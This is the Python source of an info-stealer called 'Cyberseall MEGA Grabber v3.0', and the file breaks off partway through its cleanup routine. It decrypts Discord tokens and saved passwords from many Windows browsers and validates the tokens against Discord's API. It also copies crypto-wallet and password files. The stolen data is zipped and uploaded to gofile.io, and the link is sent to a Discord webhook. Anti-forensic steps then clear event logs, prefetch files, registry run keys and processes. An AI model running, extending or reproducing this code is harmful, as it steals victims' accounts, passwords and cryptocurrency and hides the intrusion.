import os,re,requests,base64,getpass,sqlite3,shutil,platform,socket,json,zipfile,time,win32crypt,threading,psutil,subprocess
try:from Crypto.Cipher import AES
except:__import__('subprocess').run([__import__('sys').executable,'-m','pip','install','pycryptodome','--quiet'])

class CyberseallGrabber:
    def __init__(self, webhook_url):
        self.w = webhook_url
        self.t = []
        self.vt = []
        self.p = []
        self.f = []
        self.d = os.path.join(os.getenv("APPDATA"), "cyberseall")
        self.keywords = ['password','passwords','wallet','wallets','seed','seeds','private','privatekey','backup','backups','recovery']
        self.setup()
        self.g()
        self.vt = self.validate_tokens()
        self.pw()
        self.fi()
        self.si()
        self.up()
        self.send()
        self.cleanup()

    def setup(self):
        try:
            if not os.path.exists(self.d):
                os.makedirs(self.d)
            self.zf = os.path.join(self.d, "grab_" + str(int(time.time())) + ".zip")
        except:
            pass

    def g(self):
        try:
            def decrypt_token(buff, master_key):
                try:
                    return AES.new(win32crypt.CryptUnprotectData(master_key, None, None, None, 0)[1], AES.MODE_GCM, buff[3:15]).decrypt(buff[15:])[:-16].decode()
                except:
                    return None
            
            paths = {
                'Discord': os.path.join(os.getenv('APPDATA'), 'discord'),
                'Discord Canary': os.path.join(os.getenv('APPDATA'), 'discordcanary'),
                'Discord PTB': os.path.join(os.getenv('APPDATA'), 'discordptb'),
                'Discord Development': os.path.join(os.getenv('APPDATA'), 'discorddevelopment'),
                'Chrome': os.path.join(os.getenv('LOCALAPPDATA'), 'Google', 'Chrome', 'User Data', 'Default'),
                'Chrome Beta': os.path.join(os.getenv('LOCALAPPDATA'), 'Google', 'Chrome Beta', 'User Data', 'Default'),
                'Chrome Dev': os.path.join(os.getenv('LOCALAPPDATA'), 'Google', 'Chrome Dev', 'User Data', 'Default'),
                'Chrome Canary': os.path.join(os.getenv('LOCALAPPDATA'), 'Google', 'Chrome SxS', 'User Data', 'Default'),
                'Chromium': os.path.join(os.getenv('LOCALAPPDATA'), 'Chromium', 'User Data', 'Default'),
                'Edge': os.path.join(os.getenv('LOCALAPPDATA'), 'Microsoft', 'Edge', 'User Data', 'Default'),
                'Edge Beta': os.path.join(os.getenv('LOCALAPPDATA'), 'Microsoft', 'Edge Beta', 'User Data', 'Default'),
                'Edge Dev': os.path.join(os.getenv('LOCALAPPDATA'), 'Microsoft', 'Edge Dev', 'User Data', 'Default'),
                'Edge Canary': os.path.join(os.getenv('LOCALAPPDATA'), 'Microsoft', 'Edge SxS', 'User Data', 'Default'),
                'Brave': os.path.join(os.getenv('LOCALAPPDATA'), 'BraveSoftware', 'Brave-Browser', 'User Data', 'Default'),
                'Brave Beta': os.path.join(os.getenv('LOCALAPPDATA'), 'BraveSoftware', 'Brave-Browser-Beta', 'User Data', 'Default'),
                'Brave Nightly': os.path.join(os.getenv('LOCALAPPDATA'), 'BraveSoftware', 'Brave-Browser-Nightly', 'User Data', 'Default'),
                'Opera': os.path.join(os.getenv('APPDATA'), 'Opera Software', 'Opera Stable', 'Local Storage', 'leveldb'),
                'Opera GX': os.path.join(os.getenv('APPDATA'), 'Opera Software', 'Opera GX Stable', 'Local Storage', 'leveldb'),
                'Opera Beta': os.path.join(os.getenv('APPDATA'), 'Opera Software', 'Opera Beta', 'Local Storage', 'leveldb'),
                'Opera Developer': os.path.join(os.getenv('APPDATA'), 'Opera Software', 'Opera Developer', 'Local Storage', 'leveldb'),
                'Vivaldi': os.path.join(os.getenv('LOCALAPPDATA'), 'Vivaldi', 'User Data', 'Default'),
                'Yandex': os.path.join(os.getenv('LOCALAPPDATA'), 'Yandex', 'YandexBrowser', 'User Data', 'Default'),
                'UC Browser': os.path.join(os.getenv('LOCALAPPDATA'), 'UCBrowser', 'User Data_i18n', 'Default'),
                'Torch': os.path.join(os.getenv('LOCALAPPDATA'), 'Torch', 'User Data', 'Default'),
            }
            
            tokens = []
            cleaned = []
            checker = []
            already_check = []
            
            for platform, path in paths.items():
                try:
                    if not os.path.exists(path):
                        continue
                    state_file = path + "\\Local State"
                    if not os.path.isfile(state_file):
                        continue
                    with open(state_file, "r") as file:
                        key_data = file.read()
                        key = json.loads(key_data)['os_crypt']['encrypted_key']
                        file.close()
                    leveldb_path = path + "\\Local Storage\\leveldb\\"
                    if not os.path.exists(leveldb_path):
                        continue
                    for file in os.listdir(leveldb_path):
                        if not (file.endswith(".ldb") or file.endswith(".log")):
                            continue
                        try:
                            with open(leveldb_path + file, "r", errors='ignore') as files:
                                for x in files.readlines():
                                    x.strip()
                                    for values in re.findall(r"dQw4w9WgXcQ:[^.*\\['(.*)\'\\].*$][^\\\"]*", x):
                                        tokens.append(values)
                        except:
                            continue
                except:
                    continue
            
            for i in tokens:
                if i.endswith("\\"):
                    i.replace("\\", "")
                elif i not in cleaned:
                    cleaned.append(i)
            
            for token in cleaned:
                try:
                    tok = decrypt_token(base64.b64decode(token.split('dQw4w9WgXcQ:')[1]), base64.b64decode(key)[5:])
                    if tok:
                        checker.append(tok)
                except:
                    pass
            
            for value in checker:
                if value not in already_check and len(value) > 50:
                    already_check.append(value)
                    self.t.append(value)
            
            backup_paths = []
            for platform, path in paths.items():
                if 'discord' in platform.lower():
                    backup_paths.append(os.path.join(path, "Local Storage", "leveldb"))
                    backup_paths.append(os.path.join(path, "Session Storage"))
                    backup_paths.append(os.path.join(path, "IndexedDB"))
                    backup_paths.append(os.path.join(path, "databases"))
                elif path.endswith('Default') or 'profiles' in path.lower():
                    backup_paths.append(os.path.join(path, "Local Storage", "leveldb"))
                    backup_paths.append(os.path.join(path, "Session Storage"))
                    backup_paths.append(os.path.join(path, "IndexedDB"))
                    backup_paths.append(os.path.join(path, "databases"))
                    backup_paths.append(os.path.join(path, "Web Data"))
                    backup_paths.append(os.path.join(path, "Preferences"))
                    backup_paths.append(os.path.join(path, "Secure Preferences"))
            
            token_patterns = [
                r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}',
                r'mfa\.[\w-]{84}',
                r'[\w-]{26}\.[\w-]{6}\.[\w-]{38}',
                r'[\w-]{24}\.[\w-]{6}\.[\w-]{25}',
                r'OTk4MjM0NzE2NzI2MzI[a-zA-Z0-9+/=]{10,}',
                r'N[a-zA-Z0-9+/=]{20,}',
                r'[a-zA-Z0-9+/=]{88}',
                r'dQw4w9WgXcQ:[a-zA-Z0-9+/=]{100,}',
                r'[\w-]{59}\.[\w-]{6}\.[\w-]{27}',
                r'[\w-]{24}\.[\w-]{6}\.[\w-]{38}'
            ]
            
            for p in backup_paths:
                if os.path.exists(p):
                    try:
                        for f in os.listdir(p):
                            if f.endswith(('.ldb', '.log', '.sqlite', '.db', '.json')):
                                try:
                                    with open(os.path.join(p, f), 'r', errors='ignore', encoding='utf-8') as x:
                                        c = x.read()
                                        for pattern in token_patterns:
                                            backup_tokens = re.findall(pattern, c)
                                            for token in backup_tokens:
                                                if token not in self.t and len(token) > 20:
                                                    self.t.append(token)
                                except:
                                    try:
                                        with open(os.path.join(p, f), 'rb') as x:
                                            c = x.read().decode('utf-8', errors='ignore')
                                            for pattern in token_patterns:
                                                backup_tokens = re.findall(pattern, c)
                                                for token in backup_tokens:
                                                    if token not in self.t and len(token) > 20:
                                                        self.t.append(token)
                                    except:
                                        pass
                    except:
                        pass
        except:
            pass

    def validate_tokens(self):
        valid_tokens = []
        for token in list(set(self.t)):
            try:
                headers = {'Authorization': token, 'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'}
                r = requests.get('https://discord.com/api/v9/users/@me', headers=headers, timeout=10)
                if r.status_code == 200:
                    user_data = r.json()
                    token_info = {
                        'token': token,
                        'username': user_data.get('username', 'Unknown'),
                        'discriminator': user_data.get('discriminator', '0000'),
                        'id': user_data.get('id', 'Unknown'),
                        'email': user_data.get('email', 'Hidden'),
                        'phone': user_data.get('phone', 'None'),
                        'verified': user_data.get('verified', False),
                        'mfa_enabled': user_data.get('mfa_enabled', False),
                        'premium_type': user_data.get('premium_type', 0),
                        'flags': user_data.get('flags', 0),
                        'public_flags': user_data.get('public_flags', 0),
                        'avatar': user_data.get('avatar', 'None'),
                        'banner': user_data.get('banner', 'None'),
                        'accent_color': user_data.get('accent_color', 'None'),
                        'locale': user_data.get('locale', 'en-US'),
                        'nsfw_allowed': user_data.get('nsfw_allowed', False)
                    }
                    valid_tokens.append(token_info)
            except:
                pass
        return valid_tokens

    def pw(self):
        try:
            pw_data = []
            
            def get_chrome_key():
                try:
                    local_state_path = os.path.join(os.getenv("LOCALAPPDATA"), "Google", "Chrome", "User Data", "Local State")
                    with open(local_state_path, 'r', encoding='utf-8') as f:
                        local_state = json.load(f)
                    key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])[5:]
                    return win32crypt.CryptUnprotectData(key, None, None, None, 0)[1]
                except:
                    return None
            
            def decrypt_password(password, key):
                try:
                    if not password or len(password) < 15:
                        return "Failed to decrypt"
                    try:
                        iv = password[3:15]
                        password = password[15:]
                        cipher = AES.new(key, AES.MODE_GCM, iv)
                        decrypted_pass = cipher.decrypt(password)[:-16].decode()
                        if decrypted_pass:
                            return decrypted_pass
                    except:
                        pass
                    try:
                        result = win32crypt.CryptUnprotectData(password, None, None, None, 0)
                        if result and result[1]:
                            return result[1].decode() if isinstance(result[1], bytes) else str(result[1])
                    except:
                        pass
                    try:
                        if isinstance(password, bytes) and len(password) > 20:
                            printable_chars = ''.join(chr(c) for c in password if 32 <= c <= 126)
                            if len(printable_chars) > 4:
                                return f"Partially recovered: {printable_chars}"
                    except:
                        pass
                    return "Failed to decrypt"
                except Exception as e:
                    return f"Error: {str(e)[:20]}"
            
            def get_browser_key(browser_path):
                try:
                    local_state_path = os.path.join(browser_path, "Local State")
                    if os.path.exists(local_state_path):
                        with open(local_state_path, 'r', encoding='utf-8') as f:
                            local_state = json.load(f)
                        key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])[5:]
                        return win32crypt.CryptUnprotectData(key, None, None, None, 0)[1]
                except:
                    pass
                return None
            
            chrome_key = get_chrome_key()
            browsers = [
                ("Chrome", os.path.join(os.getenv("LOCALAPPDATA"), "Google", "Chrome", "User Data", "Default", "Login Data")),
                ("Chrome Beta", os.path.join(os.getenv("LOCALAPPDATA"), "Google", "Chrome Beta", "User Data", "Default", "Login Data")),
                ("Chrome Dev", os.path.join(os.getenv("LOCALAPPDATA"), "Google", "Chrome Dev", "User Data", "Default", "Login Data")),
                ("Chrome Canary", os.path.join(os.getenv("LOCALAPPDATA"), "Google", "Chrome SxS", "User Data", "Default", "Login Data")),
                ("Chromium", os.path.join(os.getenv("LOCALAPPDATA"), "Chromium", "User Data", "Default", "Login Data")),
                ("Edge", os.path.join(os.getenv("LOCALAPPDATA"), "Microsoft", "Edge", "User Data", "Default", "Login Data")),
                ("Edge Beta", os.path.join(os.getenv("LOCALAPPDATA"), "Microsoft", "Edge Beta", "User Data", "Default", "Login Data")),
                ("Edge Dev", os.path.join(os.getenv("LOCALAPPDATA"), "Microsoft", "Edge Dev", "User Data", "Default", "Login Data")),
                ("Edge Canary", os.path.join(os.getenv("LOCALAPPDATA"), "Microsoft", "Edge SxS", "User Data", "Default", "Login Data")),
                ("Brave", os.path.join(os.getenv("LOCALAPPDATA"), "BraveSoftware", "Brave-Browser", "User Data", "Default", "Login Data")),
                ("Brave Beta", os.path.join(os.getenv("LOCALAPPDATA"), "BraveSoftware", "Brave-Browser-Beta", "User Data", "Default", "Login Data")),
                ("Brave Nightly", os.path.join(os.getenv("LOCALAPPDATA"), "BraveSoftware", "Brave-Browser-Nightly", "User Data", "Default", "Login Data")),
                ("Opera", os.path.join(os.getenv("APPDATA"), "Opera Software", "Opera Stable", "Login Data")),
                ("Opera GX", os.path.join(os.getenv("APPDATA"), "Opera Software", "Opera GX Stable", "Login Data")),
                ("Opera Beta", os.path.join(os.getenv("APPDATA"), "Opera Software", "Opera Beta", "Login Data")),
                ("Opera Developer", os.path.join(os.getenv("APPDATA"), "Opera Software", "Opera Developer", "Login Data")),
                ("Vivaldi", os.path.join(os.getenv("LOCALAPPDATA"), "Vivaldi", "User Data", "Default", "Login Data")),
                ("Yandex", os.path.join(os.getenv("LOCALAPPDATA"), "Yandex", "YandexBrowser", "User Data", "Default", "Login Data")),
                ("UC Browser", os.path.join(os.getenv("LOCALAPPDATA"), "UCBrowser", "User Data_i18n", "Default", "Login Data")),
                ("Torch", os.path.join(os.getenv("LOCALAPPDATA"), "Torch", "User Data", "Default", "Login Data")),
                ("Kometa", os.path.join(os.getenv("LOCALAPPDATA"), "Kometa", "User Data", "Default", "Login Data")),
            ]
            
            for b, bp in browsers:
                if os.path.exists(bp):
                    if "Firefox" in b or "Waterfox" in b or "Pale Moon" in b or "Basilisk" in b or "Seamonkey" in b or "Thunderbird" in b or "Postbox" in b or "Flock" in b or "Wyzo" in b or "Cyberfox" in b or "BlackHawk" in b or "IceCat" in b:
                        for root, dirs, files in os.walk(bp):
                            for file in files:
                                if file == "logins.json":
                                    try:
                                        with open(os.path.join(root, file), 'r') as f:
                                            data = json.load(f)
                                            for login in data.get('logins', []):
                                                pw_data.append(b + " - " + login['hostname'] + " - " + login['username'] + " - [FIREFOX_ENCRYPTED]")
                                    except:
                                        pass
                                elif file == "signons.sqlite" or file == "key3.db" or file == "key4.db":
                                    try:
                                        tp = os.path.join(os.getenv("TEMP"), b + "_" + file + "_" + str(os.getpid()) + ".db")
                                        shutil.copy2(os.path.join(root, file), tp)
                                        cn = sqlite3.connect(tp)
                                        cr = cn.cursor()
                                        if file == "signons.sqlite":
                                            cr.execute("SELECT hostname,username,password FROM moz_logins")
                                            for u, n, pw in cr.fetchall():
                                                if n and pw:
                                                    pw_data.append(b + " - " + u + " - " + n + " - [FIREFOX_ENCRYPTED]")
                                        cn.close()
                                        os.remove(tp)
                                    except:
                                        pass
                    else:
                        try:
                            tp = os.path.join(os.getenv("TEMP"), b.replace(" ", "_") + "_" + str(os.getpid()) + ".db")
                            shutil.copy2(bp, tp)
                            cn = sqlite3.connect(tp)
                            cr = cn.cursor()
                            cr.execute("SELECT origin_url,username_value,password_value FROM logins")
                            
                            browser_key = get_browser_key(os.path.dirname(os.path.dirname(bp))) if chrome_key is None else chrome_key
                            
                            for u, n, pw in cr.fetchall():
                                if n and pw:
                                    decrypted = "Failed to decrypt"
                                    
                                    if browser_key:
                                        decrypted = decrypt_password(pw, browser_key)
                                    elif chrome_key:
                                        decrypted = decrypt_password(pw, chrome_key)
                                    
                                    if "Failed" in decrypted or "Error" in decrypted:
                                        try:
                                            decrypted = win32crypt.CryptUnprotectData(pw, None, None, None, 0)[1].decode()
                                        except:
                                            try:
                                                if isinstance(pw, bytes):
                                                    decrypted = pw.decode('utf-8', errors='ignore')
                                                    if len(decrypted) < 3:
                                                        decrypted = "[ENCRYPTED]"
                                                else:
                                                    decrypted = "[ENCRYPTED]"
                                            except:
                                                decrypted = "[ENCRYPTED]"
                                    
                                    pw_data.append(b + " - " + u + " - " + n + " - " + decrypted)
                            cn.close()
                            os.remove(tp)
                        except Exception as e:
                            pass
            
            self.p = pw_data
            with open(os.path.join(self.d, "passwords.txt"), "w") as f:
                f.write("\n".join(pw_data))
        except:
            pass

    def fi(self):
        try:
            files_data = []
            exclude_dirs = ['node_modules','venv','.git','.vs','bin','obj','packages','__pycache__','dist','build','target','out','temp','tmp','cache','logs','log','backup','backups','.vscode','.idea','vendor','third_party','3rdparty','external','lib','libs','library','libraries','dependencies','deps','modules','mod','addons','plugins','extensions','assets','resources','res','static','public','www','html','css','js','javascript','typescript','images','img','pics','pictures','photos','videos','video','audio','music','sounds','fonts','font','icons','icon','textures','texture','models','model','animations','animation','shaders','shader','materials','material','prefabs','prefab','scenes','scene','levels','level','maps','map','saves','save','configs','config','settings','prefs','preferences','options','opt','data','databases','db','sql','sqlite','mysql','postgres','mongodb','redis','cache','caches','sessions','session','cookies','cookie','temp','temporary','tmp','logs','log','debug','trace','error','errors','crash','crashes','dump','dumps','core','cores','pid','lock','locks','sem','semaphore','mutex','shared','shm','ipc','pipe','pipes','socket','sockets','fifo','fifos','dev','proc','sys','var','usr','opt','etc','boot','root','home','mnt','media','run','srv','tmp','lost+found']
            target_dirs = [
                os.path.join(os.getenv("USERPROFILE"), "Desktop"),
                os.path.join(os.getenv("USERPROFILE"), "Documents"),
                os.path.join(os.getenv("USERPROFILE"), "Downloads")
            ]
            
            for d in target_dirs:
                if os.path.exists(d):
                    for r, ds, fs in os.walk(d):
                        ds[:] = [d for d in ds if d.lower() not in exclude_dirs]
                        for f in fs:
                            if any(keyword in f.lower() for keyword in self.keywords) and f.lower().endswith(('.txt','.key','.wallet','.json','.dat','.db','.sqlite','.csv','.xml','.ini','.conf','.cfg','.env','.bak','.backup')) and os.path.getsize(os.path.join(r,f)) < 2*1024*1024 and not any(exclude in r.lower() for exclude in exclude_dirs):
                                fp = os.path.join(r, f)
                                files_data.append(fp)
                                try:
                                    shutil.copy2(fp, os.path.join(self.d, "file_" + str(len(files_data)) + "_" + f))
                                except:
                                    pass
                                if len(files_data) >= 15:
                                    break
                        if len(files_data) >= 15:
                            break
                    if len(files_data) >= 15:
                        break
            
            crypto_paths = [
                os.path.join(os.getenv("APPDATA"), "Exodus"),
                os.path.join(os.getenv("APPDATA"), "atomic"),
                os.path.join(os.getenv("APPDATA"), "Electrum"),
                os.path.join(os.getenv("APPDATA"), "Ethereum"),
                os.path.join(os.getenv("APPDATA"), "Bitcoin"),
                os.path.join(os.getenv("APPDATA"), "Litecoin"),
                os.path.join(os.getenv("APPDATA"), "Dogecoin"),
                os.path.join(os.getenv("APPDATA"), "Zcash"),
                os.path.join(os.getenv("APPDATA"), "Dash"),
                os.path.join(os.getenv("APPDATA"), "Monero"),
                os.path.join(os.getenv("LOCALAPPDATA"), "Coinomi"),
                os.path.join(os.getenv("LOCALAPPDATA"), "Jaxx"),
                os.path.join(os.getenv("APPDATA"), "com.liberty.jaxx"),
                os.path.join(os.getenv("APPDATA"), "Guarda"),
                os.path.join(os.getenv("APPDATA"), "Trust Wallet"),
                os.path.join(os.getenv("APPDATA"), "MetaMask"),
                os.path.join(os.getenv("APPDATA"), "Binance"),
                os.path.join(os.getenv("APPDATA"), "Coinbase Wallet"),
                os.path.join(os.getenv("APPDATA"), "Phantom"),
                os.path.join(os.getenv("APPDATA"), "Solflare"),
                os.path.join(os.getenv("APPDATA"), "Slope"),
                os.path.join(os.getenv("APPDATA"), "TronLink"),
                os.path.join(os.getenv("APPDATA"), "Ronin"),
                os.path.join(os.getenv("APPDATA"), "Nifty"),
                os.path.join(os.getenv("APPDATA"), "MathWallet"),
                os.path.join(os.getenv("APPDATA"), "TokenPocket"),
                os.path.join(os.getenv("APPDATA"), "iWallet"),
                os.path.join(os.getenv("APPDATA"), "Wombat"),
                os.path.join(os.getenv("APPDATA"), "MEW"),
                os.path.join(os.getenv("APPDATA"), "Guild"),
                os.path.join(os.getenv("APPDATA"), "Saturn"),
                os.path.join(os.getenv("APPDATA"), "Harmony"),
                os.path.join(os.getenv("APPDATA"), "Coin98"),
                os.path.join(os.getenv("APPDATA"), "TerraStation"),
                os.path.join(os.getenv("APPDATA"), "Keplr"),
                os.path.join(os.getenv("APPDATA"), "Cosmostation"),
                os.path.join(os.getenv("APPDATA"), "Leap"),
                os.path.join(os.getenv("APPDATA"), "Xdefi"),
                os.path.join(os.getenv("APPDATA"), "Nami"),
                os.path.join(os.getenv("APPDATA"), "Eternl"),
                os.path.join(os.getenv("APPDATA"), "Yoroi"),
                os.path.join(os.getenv("APPDATA"), "Flint"),
                os.path.join(os.getenv("APPDATA"), "Daedalus"),
                os.path.join(os.getenv("APPDATA"), "Adalite"),
                os.path.join(os.getenv("APPDATA"), "Typhon"),
                os.path.join(os.getenv("APPDATA"), "Gero"),
                os.path.join(os.getenv("APPDATA"), "NuFi"),
                os.path.join(os.getenv("APPDATA"), "Martian"),
                os.path.join(os.getenv("APPDATA"), "Pontem"),
                os.path.join(os.getenv("APPDATA"), "Petra"),
                os.path.join(os.getenv("APPDATA"), "Fewcha"),
                os.path.join(os.getenv("APPDATA"), "Spika"),
                os.path.join(os.getenv("APPDATA"), "Rise"),
                os.path.join(os.getenv("APPDATA"), "Bitkeep"),
                os.path.join(os.getenv("APPDATA"), "Enkrypt"),
                os.path.join(os.getenv("APPDATA"), "Frame"),
                os.path.join(os.getenv("APPDATA"), "Liquality"),
                os.path.join(os.getenv("APPDATA"), "XDEFI"),
                os.path.join(os.getenv("APPDATA"), "Rabby"),
                os.path.join(os.getenv("APPDATA"), "Talisman"),
                os.path.join(os.getenv("APPDATA"), "SubWallet"),
                os.path.join(os.getenv("APPDATA"), "Polkadot"),
                os.path.join(os.getenv("APPDATA"), "Clover"),
                os.path.join(os.getenv("APPDATA"), "Nova"),
                os.path.join(os.getenv("APPDATA"), "Fearless"),
                os.path.join(os.getenv("APPDATA"), "PolkaWallet"),
                os.path.join(os.getenv("APPDATA"), "Enzyme"),
                os.path.join(os.getenv("APPDATA"), "Sender"),
                os.path.join(os.getenv("APPDATA"), "Finnie"),
                os.path.join(os.getenv("APPDATA"), "ArConnect"),
                os.path.join(os.getenv("APPDATA"), "Braavos"),
                os.path.join(os.getenv("APPDATA"), "ArgentX"),
                os.path.join(os.getenv("APPDATA"), "Starknet"),
                os.path.join(os.getenv("APPDATA"), "Oxygen"),
                os.path.join(os.getenv("APPDATA"), "Backpack"),
                os.path.join(os.getenv("APPDATA"), "Glow"),
                os.path.join(os.getenv("APPDATA"), "Sollet"),
                os.path.join(os.getenv("APPDATA"), "Coin98"),
                os.path.join(os.getenv("APPDATA"), "Slope"),
                os.path.join(os.getenv("APPDATA"), "Phantom"),
                os.path.join(os.getenv("APPDATA"), "Solflare"),
                os.path.join(os.getenv("APPDATA"), "Exodus"),
                os.path.join(os.getenv("APPDATA"), "Atomic"),
                os.path.join(os.getenv("APPDATA"), "Wasabi"),
                os.path.join(os.getenv("APPDATA"), "Sparrow"),
                os.path.join(os.getenv("APPDATA"), "BlueWallet"),
            ]
            
            for cp in crypto_paths:
                if os.path.exists(cp):
                    for r, ds, fs in os.walk(cp):
                        for f in fs:
                            if f.lower().endswith(('.wallet','.dat','.key','.json','.txt')) and os.path.getsize(os.path.join(r,f)) < 10*1024*1024:
                                fp = os.path.join(r, f)
                                files_data.append(fp)
                                try:
                                    shutil.copy2(fp, os.path.join(self.d, "crypto_" + str(len(files_data)) + "_" + f))
                                except:
                                    pass
                                if len(files_data) >= 25:
                                    break
                        if len(files_data) >= 25:
                            break
                    if len(files_data) >= 25:
                        break
            
            self.f = files_data
            with open(os.path.join(self.d, "files.txt"), "w") as f:
                f.write("\n".join(files_data))
        except:
            pass

    def si(self):
        try:
            sys_info = {
                "user": getpass.getuser(),
                "computer": os.getenv("COMPUTERNAME", "Unknown"),
                "platform": platform.platform(),
                "processor": platform.processor(),
                "architecture": platform.architecture()[0],
                "ip": socket.gethostbyname(socket.gethostname()),
                "python": platform.python_version(),
                "tokens_found": len(set(self.t)),
                "valid_tokens": len(self.vt),
                "passwords_found": len(self.p),
                "files_found": len(self.f)
            }
            with open(os.path.join(self.d, "system_info.json"), "w") as f:
                json.dump(sys_info, f, indent=2)
            with open(os.path.join(self.d, "valid_tokens.json"), "w") as f:
                json.dump(self.vt, f, indent=2)
        except:
            pass

    def up(self):
        try:
            with zipfile.ZipFile(self.zf, 'w', zipfile.ZIP_DEFLATED) as zf:
                for root, dirs, files in os.walk(self.d):
                    for file in files:
                        if not file.endswith('.zip'):
                            fp = os.path.join(root, file)
                            zf.write(fp, os.path.relpath(fp, self.d))
            
            files = {"file": open(self.zf, "rb")}
            resp = requests.post("https://store1.gofile.io/uploadFile", files=files)
            files["file"].close()
            
            if resp.status_code == 200:
                data = resp.json()
                if data.get("status") == "ok":
                    self.link = data["data"]["downloadPage"]
                else:
                    self.link = "Upload failed"
            else:
                self.link = "Upload failed"
            
            try:
                os.remove(self.zf)
            except:
                pass
        except:
            self.link = "Upload failed"

    def send(self):
        try:
            embed = {
                "embeds": [{
                    "title": "🔥 CYBERSEALL MEGA GRABBER v3.0",
                    "color": 0xff0000,
                    "fields": [
                        {
                            "name": "💎 Results",
                            "value": "```" + str(len(set(self.t))) + " Raw Tokens\n" + str(len(self.vt)) + " Valid Tokens\n" + str(len(self.p)) + " Browser Passwords\n" + str(len(self.f)) + " Keyword Files```"
                        },
                        {
                            "name": "💻 Target",
                            "value": "```" + getpass.getuser() + "@" + os.getenv("COMPUTERNAME", "?") + "```"
                        },
                        {
                            "name": "📁 Download",
                            "value": "[**CLICK HERE TO DOWNLOAD**](" + str(self.link if hasattr(self, 'link') else 'Failed') + ")",
                            "inline": False
                        }
                    ],
                    "footer": {"text": "Cyberseall MEGA Grabber v3.0 - Enhanced"},
                    "timestamp": time.strftime('%Y-%m-%dT%H:%M:%S.000Z', time.gmtime())
                }]
            }
            
            requests.post(self.w, json=embed, timeout=10)
            
            if len(self.vt) > 0:
                for i, token_info in enumerate(self.vt[:3]):
                    token_embed = {
                        "embeds": [{
                            "title": "✅ VALID TOKEN #" + str(i+1),
                            "color": 0x00ff00,
                            "fields": [
                                {
                                    "name": "👤 User",
                                    "value": "```" + token_info.get('username', '?') + "#" + token_info.get('discriminator', '?') + "```"
                                },
                                {
                                    "name": "📧 Email",
                                    "value": "```" + str(token_info.get('email', 'Hidden')) + "```"
                                },
                                {
                                    "name": "🔐 Token",
                                    "value": "```" + token_info['token'][:50] + "...```"
                                },
                                {
                                    "name": "💎 Premium",
                                    "value": "```Type: " + str(token_info.get('premium_type', 0)) + "\nMFA: " + str(token_info.get('mfa_enabled', False)) + "\nVerified: " + str(token_info.get('verified', False)) + "```"
                                }
                            ],
                            "footer": {"text": "Valid Token Info"},
                            "timestamp": time.strftime('%Y-%m-%dT%H:%M:%S.000Z', time.gmtime())
                        }]
                    }
                    requests.post(self.w, json=token_embed, timeout=5)
        except:
            pass

    def cleanup(self):
        """Bereinigt den cyberseall Ordner nach dem Senden"""
        try:
            import time
            time.sleep(2)  # Kurz warten damit Upload abgeschlossen ist
            
            if os.path.exists(self.d):
                def force_remove_readonly(func, path, exc):
                    try:
                        os.chmod(path, 0o777)
                        func(path)
                    except:
                        pass
                
                try:
                    shutil.rmtree(self.d, onerror=force_remove_readonly)
                except:
                    try:
                        for root, dirs, files in os.walk(self.d, topdown=False):
                            for name in files:
                                try:
                                    file_path = os.path.join(root, name)
                                    os.chmod(file_path, 0o777)
                                    os.remove(file_path)
                                except:
                                    pass
                            for name in dirs:
                                try:
                                    dir_path = os.path.join(root, name)
                                    os.chmod(dir_path, 0o777)
                                    os.rmdir(dir_path)
                                except:
                                    pass
                        try:
                            os.rmdir(self.d)
                        except:
                            pass
                    except:
                        pass
                
                # Zusätzliche Bereinigung von temporären Dateien
                try:
                    temp_dir = os.getenv("TEMP")
                    if temp_dir and os.path.exists(temp_dir):
                        for file in os.listdir(temp_dir):
                            if "cyberseall" in file.lower() or file.startswith("grab_"):
                                try:
                                    file_path = os.path.join(temp_dir, file)
                                    if os.path.isfile(file_path):
                                        os.remove(file_path)
                                except:
                                    pass
                except:
                    pass
                
                # Browser-Cache leeren (optional)
                try:
                    browser_cache_paths = [
                        os.path.join(os.getenv("LOCALAPPDATA"), "Google", "Chrome", "User Data", "Default", "Cache"),
                        os.path.join(os.getenv("LOCALAPPDATA"), "Microsoft", "Edge", "User Data", "Default", "Cache"),
                        os.path.join(os.getenv("LOCALAPPDATA"), "BraveSoftware", "Brave-Browser", "User Data", "Default", "Cache")
                    ]
                    
                    for cache_path in browser_cache_paths:
                        if os.path.exists(cache_path):
                            try:
                                for file in os.listdir(cache_path):
                                    if "cyberseall" in file.lower():
                                        try:
                                            os.remove(os.path.join(cache_path, file))
                                        except:
                                            pass
                            except:
                                pass
                except:
                    pass
                
                # Registry-Spuren entfernen (Windows)
                try:
                    import winreg
                    reg_paths = [
                        r"SOFTWARE\Microsoft\Windows\CurrentVersion\Run",
                        r"SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Run",
                        r"SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce"
                    ]
                    
                    for reg_path in reg_paths:
                        try:
                            key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, reg_path, 0, winreg.KEY_ALL_ACCESS)
                            i = 0
                            while True:
                                try:
                                    name, value, type = winreg.EnumValue(key, i)
                                    if "cyberseall" in name.lower() or "cyberseall" in value.lower():
                                        winreg.DeleteValue(key, name)
                                    else:
                                        i += 1
                                except WindowsError:
                                    break
                            winreg.CloseKey(key)
                        except:
                            pass
                except:
                    pass
                
                # Prozess-Spuren entfernen
                try:
                    current_process = os.getpid()
                    for proc in psutil.process_iter(['pid', 'name', 'cmdline']):
                        try:
                            if proc.info['pid'] != current_process:
                                cmdline = ' '.join(proc.info['cmdline']) if proc.info['cmdline'] else ''
                                if "cyberseall" in cmdline.lower() or "grabber" in cmdline.lower():
                                    proc.terminate()
                        except:
                            pass
                except:
                    pass
                
                # Event-Log Spuren entfernen (falls möglich)
                try:
                    subprocess.run(['wevtutil', 'cl', 'Application'], capture_output=True, timeout=5)
                    subprocess.run(['wevtutil', 'cl', 'System'], capture_output=True, timeout=5)
                except:
                    pass
                
                # Prefetch-Dateien entfernen
                try:
                    prefetch_path = os.path.join(os.getenv("WINDIR", "C:\\Windows"), "Prefetch")
                    if os.path.exists(prefetch_path):
                        for file in os.listdir(prefetch_path):
                            if "cyberseall" in file.lower() or "grabber" in file.lower() or "python" in file.lower():
                                try:
                                    os.remove(os.path.join(prefetch_path, file))
                                except:
                                    pass
                except:
                    pass
                
                # Recent-Dateien entfernen
                try:
                    recent_path = os.path.join(os.getenv("APPDATA"), "Microsoft", "Windows", "Recent")
                    if os.path.exists(recent_path):
